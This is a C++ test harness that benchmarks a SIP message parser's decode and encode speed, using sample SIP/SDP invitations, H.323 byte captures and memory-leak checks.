
#include "../SIPParserLib/VS_SIPMessage.h"

#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>

const char ptr1[] =  "SIP/2.0 100 Trying\r\n"
					"Via: SIP/2.0/TCP 192.168.61.113:14412\r\n"
					"From: \"ktrushnikov\" <sip:bbs@sipnet.ru>;tag=95ccc04723bc4c62b5dcdf1379ef0f12;epid=15c9e4ba8b\r\n"
					"To: <sip:Matv@sipnet.ru>\r\n"
					"Call-ID: f03e78d6eaf04e9e8feca3b6b3c72615\r\n"
					"CSeq: 1 INVITE\r\n"
					"Server: CommuniGatePro/5.0.9\r\n"
					"Content-Length: 0\r\n"
					"\r\n"
					;
unsigned int ptr1_sz = (unsigned int) strlen(ptr1);

const char ptr2[] = "INVITE sip:4000@pca.ru SIP/2.0\r\n"
					"Via: SIP/2.0/UDP 192.168.61.64:5060;branch=z9hG4bK6ae0682d0a56d8bacbda072aa761846c\r\n"
					"From: <sip:sip@pca.ru>;tag=48e01bd7\r\n"
					"To: <sip:4000@pca.ru>\r\n"
					"Contact: <sip:sip@192.168.61.64:5060>\r\n"
					"Call-ID: 53e49f660a847ddb444a2b8b255846fd@192.168.61.64\r\n"
					"CSeq: 101 INVITE\r\n"
					"Max-Forwards: 70\r\n"
					"Expires: 180\r\n"
					"Content-Type: application/sdp\r\n"
					"Content-Length: 322\r\n"
					"\r\n"
					"v=0\r\n"
					"o=sip 891948732 891948732 IN IP4 192.168.61.64\r\n"
					"s=-\r\n"
					"c=IN IP4 192.168.61.64\r\n"
					"t=0 0\r\n"
					"m=audio 60000 RTP/AVP 0 8 4 23 22 2 21\r\n"
					"a=rtpmap:0 PCMU/8000\r\n"
					"a=rtpmap:8 PCMA/8000\r\n"
//					"a=rtpmap:18 G729/8000\r\n"
					"a=rtpmap:4 G723/8000\r\n"
					"a=rtpmap:23 G726-16/8000\r\n"
					"a=rtpmap:22 G726-24/8000\r\n"
					"a=rtpmap:2 G726-32/8000\r\n"
					"a=rtpmap:21 G726-40/8000\r\n"
					//"a=rtpmap:101 telephone-event/8000\r\n"
					//"a=fmtp:101 0-15\r\n"
					"a=ptime:20\r\n"
					"a=sendrecv\r\n"
					;
unsigned int ptr2_sz = (unsigned int) strlen(ptr2);

const char ptr_bug[] = "INVITE sip:%s SIP/2.0\r\n"
"Via: SIP/2.0/TCP %s:%d;branch=z9hG4bK\r\n"
"Max-Forwards: 66\r\n"
"From: <sip:%s>;tag=666\r\n"
"To: <sip:%s>\r\n"
"Call-ID: 777\r\n"
"CSeq: 1 INVITE\r\n"
"Contact: <sip:%s:%d>\r\n"
"Content-Type: application/sdp\r\n"
"Content-Length: 0\r\n";
//"\r\n"
//"v=0\r\n"
//"o=videoport_gw@videoport.ru 19169 19169 IN IP4 %s\r\n"
//"s=noname\r\n"
//"c=IN IP4 %s\r\n"
//"b=AS:256\r\n"
//"t=0 0\r\n"
//"m=audio 4000 RTP/AVP 15 4 18 8 0\r\n"
//"c=IN IP4 %s\r\n"
//"a=rtpmap:15 G728/8000\r\n"
//"a=rtpmap:4 G723/8000\r\n"
//"a=rtpmap:18 G729A/8000\r\n"
//"a=fmtp:18 annexb=no\r\n"
//"a=rtpmap:8 PCMA/8000\r\n"
//"a=rtpmap:0 PCMU/8000\r\n"
//"a=sendrecv\r\n"
//"m=video 4002 RTP/AVP 100 101 34 31\r\n"
//"c=IN IP4 %s\r\n"
//"b=TIAS:262144\r\n"
//"a=rtpmap:100 H264/90000\r\n"
//"a=fmtp:100 profile-level-id=42000d\r\n"
//"a=rtpmap:101 H263-1998/90000\r\n"
//"a=fmtp:101 CIF=1;QCIF=1;CIF4=2;F;I;J;T\r\n"
//"a=rtpmap:34 H263/90000\r\n"
//"a=fmtp:34 CIF=1;QCIF=1\r\n"
//"a=rtpmap:31 H261/90000\r\n"
//"a=fmtp:31 CIF=1; QCIF=1\r\n"
					;
unsigned int ptr_bug_sz = (unsigned int) strlen(ptr_bug);


const char ptr_juphoon[] = "INVITE sip:172.19.19.61:5063 SIP/2.0\r\n" 
"To: sip:172.19.19.61:5063\r\n" 
"From: sip:caller@university.edu\r\n" 
"Call-ID: 0ha0isndaksdj@10.0.0.1\r\n" 
"CSeq: 8 INVITE\r\n" 
"Via: SIP/2.0/UDP 172.19.19.61:5060\r\n" 
"Content-Type: application/sdp\r\n" 
"Content-Length: 162\r\n" 
"\r\n" 
"v=0\r\n" 
"o=mhandley 29739 7272939 IN IP4 126.5.4.3\r\n" 
"s=-\r\n" 
"c=IN IP4 135.180.130.88\r\n" 
"t=0 0\r\n" 
"m=audio 49210 RTP/AVP 0 12\r\n" 
"m=video 3227 RTP/AVP 31\r\n" 
"a=rtpmap:31 LPC/8000\r\n\r\n";

unsigned int ptr_juphoon_sz = (unsigned int) strlen(ptr_juphoon);

bool ShowParserStat(const unsigned long tick1, const unsigned long tick2, const unsigned int times)
{
	if (!times)
		return false;

	unsigned long delta_tick = tick2 - tick1;

	unsigned long tick_per_mes = delta_tick / times;
	double mes_per_tick = (double)times / delta_tick;
	double mes_per_sec = mes_per_tick * 1000;

	printf("Total Time: %8.8d\tMessage/Sec: %4.4f\tMessages: %d\n", delta_tick, mes_per_sec, times);
	return true;
}

#include <ctime>
#include <boost/timer.hpp>

bool test_decode(const char* message, const unsigned int message_sz, const unsigned int times)
{

	unsigned long tick1 = GetTickCount();
	boost::timer t1;

		for (unsigned int i=0; i < times; i++)
		{
			VS_SIPMessage* msg = new VS_SIPMessage;

			if ( e_ok != msg->Decode(message, message_sz) )
				return false;

			if (msg) { delete msg; msg = 0; }
		}

	unsigned long tick2 = GetTickCount();
	double elapsed = t1.elapsed();
//	printf("\nDecode(boost::timer): total_t: %f, msg/sec: %f\n", elapsed, ((double)times)/elapsed);

	

	return ShowParserStat(tick1, tick2, times);
}

bool test_encode(const char* message, const unsigned int message_sz, const unsigned int times)
{
	VS_SIPMessage* msg = new VS_SIPMessage;

	if ( e_ok != msg->Decode(message, message_sz) )
		return false;

	unsigned long tick1 = GetTickCount();

		char out[65535];
		unsigned int out_sz = 65535;

		for (unsigned int i=0; i < times; i++)
		{
			if ( e_ok != msg->Encode(out, out_sz) )
				return false;

			out_sz = 65535;
		}

	unsigned long tick2 = GetTickCount();

	if (msg) { delete msg; msg = 0; }

	return ShowParserStat(tick1, tick2, times);
}

bool test_decode_encode(const char* message, const unsigned int message_sz, const unsigned int times)
{
	VS_SIPMessage* msg = new VS_SIPMessage;

	char out[65535];
	unsigned int out_sz = 65535;

	unsigned long tick1 = GetTickCount();

		for (unsigned int i=0; i < times; i++)
		{
			if ( e_ok != msg->Decode(message, message_sz) )
				return false;

			if ( e_ok != msg->Encode(out, out_sz) )
				return false;

			out_sz = 65535;
		}

	unsigned long tick2 = GetTickCount();

	if (msg) { delete msg; msg = 0; }

	return ShowParserStat(tick1, tick2, times);
}

bool test1()
{

	boost::timer t;
	unsigned int i=0;
//	for(unsigned int num=1; i < 30000; i++/*, num = num*10*/)
	{
		if ( !test_decode(ptr_juphoon, ptr_juphoon_sz, 30000) )
			return false;
	}
	double elapsed = t.elapsed();
	printf("total_t: %f, msg/sec: %f\n", elapsed, ((double)(30000))/elapsed);

	return true;

	printf("====[ Decode SIP (%d) ]=======================================\n", ptr1_sz);
	for(unsigned int i=0, num=1; i < 6; i++, num = num*10)
		if ( !test_decode(ptr_juphoon, ptr_juphoon_sz, num) )
			return false;

	printf("\n\n====[ Decode SIP/SDP (%d) ]=========================================\n", ptr2_sz);
	for(unsigned int i=0, num=1; i < 5; i++, num = num*10)
		if ( !test_decode(ptr2, ptr2_sz, num) )
			return false;

	printf("\n\n====[ Encode SIP (%d) ]=========================================\n", ptr1_sz);
	for(unsigned int i=0, num=10000; i < 3; i++, num = num*10)
		if ( !test_encode(ptr1, ptr1_sz, num) )
			return false;

	printf("\n\n====[ Encode SIP/SDP (%d) ]=========================================\n", ptr2_sz);
	for(unsigned int i=0, num=10000; i < 3; i++, num = num*10)
		if ( !test_encode(ptr2, ptr2_sz, num) )
			return false;

	printf("\n\n====[ Decode/Encode SIP (%d) ]=========================================\n", ptr1_sz);
	for(unsigned int i=0, num=1; i < 3; i++, num = num*10)
		if ( !test_decode_encode(ptr1, ptr1_sz, num) )
			return false;

	printf("\n\n====[ Decode/Encode SIP/SDP (%d) ]=========================================\n", ptr2_sz);
	for(unsigned int i=0, num=1; i < 3; i++, num = num*10)
		if ( !test_decode_encode(ptr2, ptr2_sz, num) )
			return false;

	return true;
}

bool test2()
{
	const unsigned int times = 100;
	const unsigned int tests = 20;

	printf("----[ Decode (%d) ]-----------------------------------\n", ptr1_sz);
	for(unsigned int i=1; i <= tests; i++)
	{
		printf("%d). ", i);
		if ( !test_decode(ptr1, ptr1_sz, times) )
			return false;
	}

	return true;
}

bool test_performance()
{
	//printf("---[ Test3::Decode (%d) ]-----------------------------------\n", ptr2_sz);
	//if ( !test_decode(ptr2, ptr2_sz, 100) )
	//	return false;

	//printf("---[ Test3::Decode (%d) ]-----------------------------------\n", ptr1_sz);
	//if ( !test_decode(ptr1, ptr1_sz, 100) )
	//	return false;

	return true;
}

bool test_bug_medias_streams()
{
	VS_SIPMessage* msg = new VS_SIPMessage;

	if ( e_ok != msg->Decode(ptr_bug, ptr_bug_sz) )
		return false;

	if (msg) { delete msg; msg = 0; }

	return false;
}

class H264Codec * __cdecl VS_RetriveH264Codec(int,bool){return 0;};
class VPXCodec * __cdecl VS_RetriveVPXCodec(int,bool){return 0;};
void __cdecl IppLibInit(void){};

int main1()
{
	//test_bug_medias_streams();
	//return true;

_CrtMemState s1, s2, s3;

_CrtMemCheckpoint( &s1 );
	if ( !test1() )
		return false;
_CrtMemCheckpoint( &s2 );

if ( _CrtMemDifference( &s3, &s1, &s2) ) 
   _CrtMemDumpStatistics( &s3 );

_CrtDumpMemoryLeaks();

	printf("\n\n====[ Memory Leaks ]===================================================\n");
	for(unsigned int i=0; i < _MAX_BLOCKS; i++)
		printf("iCounts[%d] = %d\n", i, s3.lSizes[i]);

	return true;
}


#include "../tools/SingleGatewayLib/VS_TerminalAbstractFactory.h"
#include "../tools/SingleGatewayLib/VS_CallSignallingMgr.h"
#include "../tools/SingleGatewayLib/VS_CallSetup.h"
#include "../tools/SingleGatewayLib/VS_CapabilityExchange.h"

#include "../tools/SingleGatewayLib/VS_H323Call.h"

int main2()
{
	VS_TerminalAbstractFactory::FactoryInit(1);
	//VS_CallSignallingMgr mgr;
	//VS_CallSetup s;

	//VS_H323Call h323call;
	//mgr.Init(&h323call);
	//s.Init(&mgr);

//	s.SetRecvBuf((const unsigned char*) peer1_1, sizeof(peer1_1), e_H225);

	return 0;
}


//#include "../Servers/SingleGatewayLib/VS_GatewayConferenceStatus.h"
//#include "../Servers/SingleGatewayLib/VS_SIPCall.h"
#include "../tools/SingleGatewayLib/VS_SIPStartState.h"

char peer1_0[] = {
	0x03, 0x00, 0x02, 0x81, 0x02, 0x70, 0x01, 0x06, 
	0x00, 0x08, 0x81, 0x75, 0x00, 0x0c, 0x80, 0x20, 
	0x80, 0x00, 0x3c, 0x00, 0x01, 0x00, 0x00, 0x01, 
	0x1f, 0x80, 0x01, 0x1f, 0x84, 0x02, 0x04, 0x00, 
	0x08, 0x09, 0x7c, 0x07, 0x60, 0x06, 0x30, 0x00, 
	0x24, 0x00, 0x00, 0x40, 0x01, 0x00, 0x01, 0x00, 
	0x10, 0x80, 0x00, 0x00, 0x08, 0xb0, 0x00, 0x1d, 
	0xff, 0xc0, 0x00, 0x01, 0x09, 0xfc, 0x00, 0x00, 
	0x0a, 0x1d, 0xff, 0x00, 0x70, 0x40, 0x01, 0x00, 
	0x80, 0x00, 0x02, 0x20, 0xc0, 0x27, 0x80, 0x00, 
	0x03, 0x20, 0x40, 0x27, 0x80, 0x00, 0x04, 0x21, 
	0x40, 0x27, 0x80, 0x00, 0x05, 0x22, 0x40, 0x27, 
	0x80, 0x00, 0x06, 0x24, 0x30, 0x11, 0x60, 0x00, 
	0x06, 0x00, 0x07, 0xb8, 0x35, 0x01, 0x00, 0x40, 
	0x5d, 0xc0, 0x01, 0x00, 0x12, 0x00, 0x02, 0x80, 
	0x00, 0x07, 0x24, 0x30, 0x11, 0x60, 0x00, 0x06, 
	0x00, 0x07, 0xb8, 0x35, 0x01, 0x00, 0x40, 0x7d, 
	0x00, 0x01, 0x00, 0x12, 0x00, 0x02, 0x80, 0x00, 
	0x08, 0x80, 0x06, 0x80, 0x70, 0x01, 0x00, 0x01, 
	0x80, 0x80, 0x00, 0x09, 0x85, 0x01, 0x40, 0x80, 
	0x00, 0x0a, 0x48, 0xc6, 0x80, 0x02, 0x80, 0x80, 
	0x00, 0x0b, 0x04, 0x82, 0x01, 0x01, 0x00, 0x03, 
	0x01, 0x01, 0x00, 0x80, 0x00, 0x0c, 0x09, 0xfc, 
	0x00, 0x00, 0x0a, 0x1d, 0xff, 0x00, 0x70, 0x50, 
	0x01, 0x00, 0x79, 0x88, 0x00, 0x00, 0x02, 0x40, 
	0x00, 0x57, 0x00, 0x3b, 0x00, 0x57, 0x00, 0x3b, 
	0x40, 0x20, 0x40, 0x00, 0xaf, 0x00, 0x77, 0x00, 
	0xaf, 0x00, 0x77, 0x41, 0x20, 0x40, 0x00, 0x9f, 
	0x00, 0x77, 0x00, 0x9f, 0x00, 0x77, 0x41, 0x20, 
	0x00, 0x00, 0xc7, 0x00, 0x95, 0x00, 0xc7, 0x00, 
	0x95, 0x42, 0x20, 0x00, 0x00, 0xff, 0x00, 0xbf, 
	0x00, 0xff, 0x00, 0xbf, 0x43, 0x20, 0x00, 0x01, 
	0x3f, 0x00, 0xbf, 0x01, 0x3f, 0x00, 0xbf, 0x43, 
	0x20, 0x00, 0x01, 0x3f, 0x00, 0xc7, 0x01, 0x3f, 
	0x00, 0xc7, 0x43, 0x20, 0x00, 0x01, 0x3f, 0x00, 
	0xb3, 0x01, 0x3f, 0x00, 0xb3, 0x42, 0x20, 0x00, 
	0x00, 0x7f, 0x00, 0x47, 0x00, 0x7f, 0x00, 0x47, 
	0x40, 0x20, 0x00, 0x00, 0xff, 0x00, 0x8f, 0x00, 
	0xff, 0x00, 0x8f, 0x41, 0x20, 0x00, 0x70, 0x01, 
	0x00, 0x02, 0x00, 0x00, 0x80, 0x00, 0x0d, 0x0c, 
	0x08, 0x15, 0x40, 0x01, 0x16, 0x00, 0x1d, 0xff, 
	0x80, 0x01, 0x20, 0x00, 0x06, 0x00, 0x08, 0x81, 
	0x6f, 0x01, 0x02, 0x01, 0x00, 0x11, 0x01, 0x80, 
	0x00, 0x0e, 0x0c, 0x08, 0x1c, 0x40, 0x01, 0x3f, 
	0x80, 0x00, 0x01, 0x40, 0x1d, 0xff, 0x00, 0x70, 
	0x40, 0x01, 0x00, 0x01, 0x20, 0x00, 0x06, 0x00, 
	0x08, 0x81, 0x6f, 0x01, 0x02, 0x01, 0x00, 0x11, 
	0x01, 0x80, 0x00, 0x0f, 0x0c, 0x08, 0x80, 0x96, 
	0x40, 0x01, 0x3f, 0x80, 0x00, 0x01, 0x40, 0x1d, 
	0xff, 0x00, 0x70, 0x50, 0x01, 0x00, 0x79, 0x88, 
	0x00, 0x00, 0x02, 0x40, 0x00, 0x57, 0x00, 0x3b, 
	0x00, 0x57, 0x00, 0x3b, 0x40, 0x20, 0x40, 0x00, 
	0xaf, 0x00, 0x77, 0x00, 0xaf, 0x00, 0x77, 0x41, 
	0x20, 0x40, 0x00, 0x9f, 0x00, 0x77, 0x00, 0x9f, 
	0x00, 0x77, 0x41, 0x20, 0x00, 0x00, 0xc7, 0x00, 
	0x95, 0x00, 0xc7, 0x00, 0x95, 0x42, 0x20, 0x00, 
	0x00, 0xff, 0x00, 0xbf, 0x00, 0xff, 0x00, 0xbf, 
	0x43, 0x20, 0x00, 0x01, 0x3f, 0x00, 0xbf, 0x01, 
	0x3f, 0x00, 0xbf, 0x43, 0x20, 0x00, 0x01, 0x3f, 
	0x00, 0xc7, 0x01, 0x3f, 0x00, 0xc7, 0x43, 0x20, 
	0x00, 0x01, 0x3f, 0x00, 0xb3, 0x01, 0x3f, 0x00, 
	0xb3, 0x42, 0x20, 0x00, 0x00, 0x7f, 0x00, 0x47, 
	0x00, 0x7f, 0x00, 0x47, 0x40, 0x20, 0x00, 0x00, 
	0xff, 0x00, 0x8f, 0x00, 0xff, 0x00, 0x8f, 0x41, 
	0x20, 0x00, 0x70, 0x01, 0x00, 0x02, 0x00, 0x00, 
	0x01, 0x20, 0x00, 0x06, 0x00, 0x08, 0x81, 0x6f, 
	0x01, 0x02, 0x01, 0x00, 0x11, 0x01, 0x80, 0x00, 
	0x10, 0x86, 0x09, 0x00, 0x00, 0x06, 0x00, 0x08, 
	0x81, 0x6f, 0x01, 0x01, 0x02, 0x80, 0x00, 0x02, 
	0x05, 0x00, 0x02, 0x00, 0x03, 0x00, 0x04, 0x00, 
	0x05, 0x00, 0x06, 0x00, 0x07, 0x02, 0x00, 0x00, 
	0x00, 0x01, 0x00, 0x0c, 0x00, 0x00, 0x0a, 0x80, 
	0x01, 0x03, 0x05, 0x00, 0x02, 0x00, 0x03, 0x00, 
	0x04, 0x00, 0x05, 0x00, 0x06, 0x00, 0x07, 0x02, 
	0x00, 0x00, 0x00, 0x01, 0x00, 0x0c, 0x02, 0x00, 
	0x00, 0x00, 0x01, 0x00, 0x0c, 0x00, 0x00, 0x0a, 
	0x80, 0x02, 0x03, 0x05, 0x00, 0x02, 0x00, 0x03, 
	0x00, 0x04, 0x00, 0x05, 0x00, 0x06, 0x00, 0x07, 
	0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0c, 0x02, 
	0x00, 0x0d, 0x00, 0x0e, 0x00, 0x0f, 0x00, 0x00, 
	0x0a };
	char peer1_1[] = {
		0x03, 0x00, 0x00, 0x07, 0x21, 0x80, 0x7a };
		char peer1_2[] = {
			0x03, 0x00, 0x00, 0x0b, 0x01, 0x00, 0xbe, 0x80, 
			0xbe, 0xfc, 0x95 };
			char peer1_3[] = {
				0x03, 0x00, 0x00, 0x06, 0x20, 0xa0 };
				char peer1_4[] = {
					0x03, 0x00, 0x00, 0x30, 0x6d, 0x20, 0x82, 0x01, 
					0x01, 0x00, 0x25, 0x00, 0x06, 0x20, 0x46, 0x38, 
					0x2e, 0x32, 0x20, 0x50, 0x41, 0x4c, 0x2c, 0x20, 
					0x54, 0x41, 0x4e, 0x44, 0x42, 0x45, 0x52, 0x47, 
					0x20, 0x50, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65, 
					0x20, 0x38, 0x30, 0x30, 0x30, 0x4d, 0x58, 0x50, 
					0x03, 0x00, 0x00, 0x07, 0x09, 0x00, 0x01 };
					char peer1_5[] = {
						0x03, 0x00, 0x00, 0x1f, 0x22, 0xc0, 0x03, 0x08, 
						0x06, 0x80, 0x14, 0x5c, 0x00, 0x00, 0xac, 0x10, 
						0x03, 0x84, 0x09, 0x8e, 0x00, 0xac, 0x10, 0x03, 
						0x84, 0x09, 0x8f, 0x03, 0x00, 0x01, 0x00 };
						char peer1_6[] = {
							0x03, 0x00, 0x00, 0x1f, 0x22, 0xc0, 0x03, 0x09, 
							0x06, 0x80, 0x14, 0x5c, 0x02, 0x00, 0xac, 0x10, 
							0x03, 0x84, 0x09, 0x90, 0x00, 0xac, 0x10, 0x03, 
							0x84, 0x09, 0x91, 0x03, 0x00, 0x01, 0x00, 0x03, 
							0x00, 0x00, 0x0b, 0x48, 0x00, 0x03, 0x09, 0x20, 
							0x1d, 0x60, 0x03, 0x00, 0x00, 0x1d, 0x03, 0x00, 
							0x00, 0x00, 0x0d, 0x20, 0x13, 0x80, 0x10, 0x84, 
							0x00, 0x01, 0x00, 0xac, 0x10, 0x03, 0x84, 0x09, 
							0x8f, 0x05, 0x00, 0x03, 0x10, 0x00, 0x40 };
							char peer1_7[] = {
								0x03, 0x00, 0x00, 0x09, 0x69, 0x00, 0x00, 0x00, 
								0x08 };
								char peer1_8[] = {
									0x03, 0x00, 0x00, 0x38, 0x03, 0x00, 0x00, 0x01, 
									0x08, 0xee, 0x00, 0x00, 0xa0, 0x1c, 0xbf, 0x00, 
									0x70, 0x50, 0x01, 0x00, 0x0a, 0x80, 0x00, 0x00, 
									0x00, 0x0e, 0x01, 0x00, 0x02, 0x00, 0x00, 0x80, 
									0x17, 0x84, 0x60, 0x02, 0x00, 0xac, 0x10, 0x03, 
									0x84, 0x09, 0x91, 0x2c, 0x00, 0x04, 0x48, 0x09, 
									0x7c, 0xca, 0x05, 0x00, 0x03, 0x10, 0x00, 0x40 };
									char peer1_9[] = {
										0x03, 0x00, 0x00, 0x0d, 0x70, 0xe0, 0x06, 0x00, 
										0x00, 0x01, 0x20, 0x1c, 0xc0 };
										char peer1_10[] = {
											0x03, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 
											0x00 };
											char peer1_11[] = {
												0x03, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x01, 
												0x00, 0x03, 0x00, 0x00, 0x06, 0x4a, 0x40 };

	int main3()
	{
		VS_TerminalAbstractFactory::FactoryInit(1);
		//VS_CallSignallingMgr mgr;
		//VS_CapabilityExchange s;

		//VS_H323Call h323call;
		//mgr.Init(&h323call);
		//s.Init(&mgr);

		/*unsigned long sz = 0;
		unsigned char buf[65535] = {0};

		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_0, sizeof(peer1_0), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_1, sizeof(peer1_1), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_2, sizeof(peer1_2), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_3, sizeof(peer1_3), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_4, sizeof(peer1_4), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_5, sizeof(peer1_5), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_6, sizeof(peer1_6), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_7, sizeof(peer1_7), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_8, sizeof(peer1_8), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_9, sizeof(peer1_9), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_10, sizeof(peer1_10), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
		s.SetRecvBuf((const unsigned char*) peer1_11, sizeof(peer1_11), e_H245);
		for(int i=0; i<5; ++i)	s.GetBufForSend(buf, sz, e_H245);
//		s.SetRecvBuf((const unsigned char*) peer1_12, sizeof(peer1_12), e_H245);*/

		return 0;
	}



#include "../acs/Lib/VS_AcsLib.h"
#include "../acs/connection/VS_ConnectionUDP.h"
#include "../acs/connection/VS_ConnectionTCP.h"

int main4()
{
	const char msg1_TCP[] = "INVITE sip:test1@eserv.bveb.by SIP/2.0\r\n"

"Via: SIP/2.0/TCP 172.16.10.24:5060;branch=z9hG4bKf397ea4af2f4d5530006fe2c95cfa6c6.1;rport\r\n"
"Call-ID: deca1396c86f073f@172.16.10.24\r\n"
"CSeq: 100 INVITE\r\n"
"Contact: <sip:gob.c20@172.16.10.24:5060;transport=tcp>\r\n"
"From: <sip:gob.c20@192.168.77.213>;tag=b4f6d95c77423645\r\n"
"To: <sip:test1@eserv.bveb.by>\r\n"
"Max-Forwards: 70\r\n"
"Route: <sip:192.168.77.213;lr>\r\n"
"Allow: INVITE,ACK,CANCEL,BYE,UPDATE,INFO,OPTIONS,REFER,NOTIFY\r\n"
"User-Agent: TANDBERG/512 (TC3.1.3.234045)\r\n"
"Supported: replaces,100rel,timer,gruu,path,outbound\r\n"
"Session-Expires: 500\r\n"
"Content-Type: application/sdp\r\n"
"Content-Length: 2081\r\n"
"\r\n"
"v=0\r\n"
"o=tandberg 70 3 IN IP4 172.16.10.24\r\n"
"s=-\r\n"
"c=IN IP4 172.16.10.24\r\n"
"b=CT:1920\r\n"
"t=0 0\r\n"
"m=audio 2406 RTP/AVP 100 101 102 103 104 9 8 0\r\n"
"b=TIAS:64000\r\n"
"a=rtpmap:100 MP4A-LATM/90000\r\n"
"a=fmtp:100 profile-level-id=24;object=23;bitrate=64000\r\n"
"a=rtpmap:101 MP4A-LATM/90000\r\n"
"a=fmtp:101 profile-level-id=24;object=23;bitrate=56000\r\n"
"a=rtpmap:102 MP4A-LATM/90000\r\n"
"a=fmtp:102 profile-level-id=24;object=23;bitrate=48000\r\n"
"a=rtpmap:103 G7221/16000\r\n"
"a=fmtp:103 bitrate=32000\r\n"
"a=rtpmap:104 G7221/16000\r\n"
"a=fmtp:104 bitrate=24000\r\n"
"a=rtpmap:9 G722/8000\r\n"

"a=rtpmap:8 PCMA/8000\r\n"

"a=rtpmap:0 PCMU/8000\r\n"

"a=sendrecv\r\n"

"m=video 2408 RTP/AVP 97 98 99 34 31\r\n"

"b=TIAS:1920000\r\n"

"a=rtpmap:97 H264/90000\r\n"

"a=fmtp:97 profile-level-id=428016;max-mbps=245000;max-fs=9000;max-smbps=245000\r\n"

"a=rtpmap:98 H264/90000\r\n"

"a=fmtp:98 profile-level-id=428016;max-mbps=245000;max-fs=9000;max-smbps=245000;packetization-mode=1\r\n"

"a=rtpmap:99 H263-1998/90000\r\n"

"a=fmtp:99 custom=1024,768,1;custom=1024,576,2;custom=800,600,1;cif4=1;custom=640,480,1;custom=512,288,1;cif=1;custom=352,240,1;qcif=1;maxbr=19200\r\n"

"a=rtpmap:34 H263/90000\r\n"

"a=fmtp:34 cif=1;qcif=1;maxbr=19200\r\n"

"a=rtpmap:31 H261/90000\r\n"

"a=fmtp:31 cif=1;qcif=1;maxbr=19200\r\n"

"a=rtcp-fb:* nack pli\r\n"

"a=sendrecv\r\n"

"a=content:main\r\n"

"a=label:11\r\n"
"a=answer:full\r\n"
"m=application 5070 UDP/BFCP *\r\n"
"a=floorctrl:c-s\r\n"
"a=confid:1\r\n"
"a=floorid:2 mstrm:12\r\n"
"a=userid:70\r\n"
"a=setup:passive\r\n"
"a=connection:new\r\n"
"m=video 2410 RTP/AVP 97 98 99 34 31\r\n"
"b=TIAS:1920000\r\n"
"a=rtpmap:97 H264/90000\r\n"
"a=fmtp:97 profile-level-id=428016;max-mbps=58000;max-fs=3840;max-smbps=58000\r\n"
"a=rtpmap:98 H264/90000\r\n"
"a=fmtp:98 profile-level-id=428016;max-mbps=58000;max-fs=3840;max-smbps=58000;packetization-mode=1\r\n"
"a=rtpmap:99 H263-1998/90000\r\n"
"a=fmtp:99 custom=1024,768,2;custom=1024,576,2;custom=800,600,1;cif4=1;custom=640,480,1;custom=512,288,1;cif=1;custom=352,240,1;qcif=1;maxbr=19200\r\n"
"a=rtpmap:34 H263/90000\r\n"
"a=fmtp:34 cif=1;qcif=1;maxbr=19200\r\n"
"a=rtpmap:31 H261/90000\r\n"
"a=fmtp:31 cif=1;qcif=1;maxbr=19200\r\n"
"a=rtcp-fb:* nack pli\r\n"
"a=sendrecv\r\n"
"a=content:slides\r\n"
"a=label:12\r\n"
"m=application 2412 RTP/AVP 105\r\n"
"a=rtpmap:105 H224/4800\r\n"
"a=sendrecv\r\n"
;

//REGISTER sip:192.168.77.213 SIP/2.0
//
//Via: SIP/2.0/TCP 172.16.10.24:5060;branch=z9hG4bKef6d6761eee30b6738f223cbe4e6b5cf.1;rport
//
//Call-ID: 42b7569267171f8a@172.16.10.24
//
//CSeq: 72747 REGISTER
//
//Contact: <sip:gob.c20@172.16.10.24:5060;transport=tcp>;+sip.instance="<urn:uuid:1435f3d1-5c87-52bd-a3ec-aeaf019206f0>"
//
//From: <sip:gob.c20@192.168.77.213>;tag=41ab7538a472118e
//
//To: <sip:gob.c20@192.168.77.213>
//
//Max-Forwards: 70
//
//Route: <sip:192.168.77.213;lr>
//
//Allow: INVITE,ACK,CANCEL,BYE,UPDATE,INFO,OPTIONS,REFER,NOTIFY
//
//User-Agent: TANDBERG/512 (TC3.1.3.234045)
//
//Expires: 3600
//
//Supported: replaces,100rel,timer,gruu,path,outbound
//
//Content-Length: 0
//
//
//

unsigned long msg1_TCP_sz = (unsigned int) strlen(msg1_TCP);

	VS_ConnectionTCP TCP;
	
	if ( !VS_AcsLibInitial() )
	{
		printf("[-] VS_AcsLibInitial()\n");
		return 0;
	}else{
		printf("[+] VS_AcsLibInitial()\n");
	}

	const unsigned long host_sz = 256;
	char host[host_sz];
	if (!VS_GetDefaultHostName(host , 256))
	{
		printf("[-] VS_GetDefaultHostName()\n");
		return 0;
	}else{
		printf("[+] VS_GetDefaultHostName()\n");
	}

	//if ( !TCP.Bind(host, 5060) )
	//{
	//	printf("[-] Bind()\n");
	//	return 0;
	//}else{
	//	printf("[+] Bind()\n");
	//}

//	const unsigned long ip = 0xD43523DB;	// "sipnet.ru"
//	const unsigned long ip = 0xC0A83DAF;	// "192.168.61.175"
